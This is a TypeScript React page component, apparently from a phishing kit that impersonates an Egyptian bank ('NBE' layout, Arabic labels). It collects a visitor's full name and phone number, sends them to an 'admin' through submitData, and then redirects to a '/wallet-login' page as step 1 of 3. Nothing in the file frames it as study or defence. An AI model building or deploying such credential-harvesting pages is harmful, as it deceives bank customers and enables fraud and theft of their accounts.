import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { navigateToPage, submitData } from "@/lib/store";
import NBELayout from "./components/NBELayout";

export default function PersonalInfoPage() {
  const [, setLocation] = useLocation();
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [errors, setErrors] = useState<{ name?: string; phone?: string }>({});

  useEffect(() => {
    navigateToPage("المعلومات الشخصية");
  }, []);

  const validate = () => {
    const newErrors: { name?: string; phone?: string } = {};
    if (!fullName.trim()) {
      newErrors.name = "يرجى إدخال الاسم الكامل";
    }
    if (!phone.trim()) {
      newErrors.phone = "يرجى إدخال رقم الهاتف";
    } else if (phone.length < 10) {
      newErrors.phone = "رقم الهاتف غير صحيح";
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    // Submit data to admin
    submitData({
      "الاسم الكامل": fullName,
      "رقم الهاتف": phone,
    });

    // Navigate to login page
    setLocation("/wallet-login");
  };

  return (
    <NBELayout currentStep={1} totalSteps={3}>
      <div className="text-center mb-6">
        <h2 className="text-xl font-bold text-[#1a6d3a] mb-2" style={{ fontFamily: "'Tajawal', sans-serif" }}>المعلومات الشخصية</h2>
        <p className="text-gray-500 text-sm" style={{ fontFamily: "'Tajawal', sans-serif" }}>أدخل بياناتك الشخصية للمتابعة</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        {/* Full Name */}
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2 text-right" style={{ fontFamily: "'Tajawal', sans-serif" }}>
            الاسم الكامل
          </label>
          <input
            type="text"
            value={fullName}
            onChange={(e) => {
              setFullName(e.target.value);
              if (errors.name) setErrors({ ...errors, name: undefined });
            }}
            placeholder="أدخل اسمك الكامل"
            className={`w-full px-4 py-3 rounded-xl border-2 ${
              errors.name ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-green-500"
            } outline-none transition-colors text-right bg-gray-50 focus:bg-white`}
            style={{ fontFamily: "'Tajawal', sans-serif" }}
            dir="rtl"
          />
          {errors.name && (
            <p className="text-red-500 text-xs mt-1">{errors.name}</p>
          )}
        </div>

        {/* Phone Number */}
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2 text-right" style={{ fontFamily: "'Tajawal', sans-serif" }}>
            رقم الهاتف
          </label>
          <input
            type="tel"
            value={phone}
            onChange={(e) => {
              const val = e.target.value.replace(/[^0-9+]/g, "");
              setPhone(val);
              if (errors.phone) setErrors({ ...errors, phone: undefined });
            }}
            placeholder="011XXXXXXXXX"
            className={`w-full px-4 py-3 rounded-xl border-2 ${
              errors.phone ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-green-500"
            } outline-none transition-colors text-right bg-gray-50 focus:bg-white`}
            style={{ fontFamily: "'Tajawal', sans-serif" }}
            dir="ltr"
          />
          {errors.phone && (
            <p className="text-red-500 text-xs mt-1">{errors.phone}</p>
          )}
        </div>

        {/* Submit Button - التالي ← */}
        <button
          type="submit"
          className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg mt-4 flex items-center justify-center gap-2"
          style={{ fontFamily: "'Tajawal', sans-serif" }}
        >
          <span>التالي</span>
          <span>←</span>
        </button>
      </form>
    </NBELayout>
  );
}
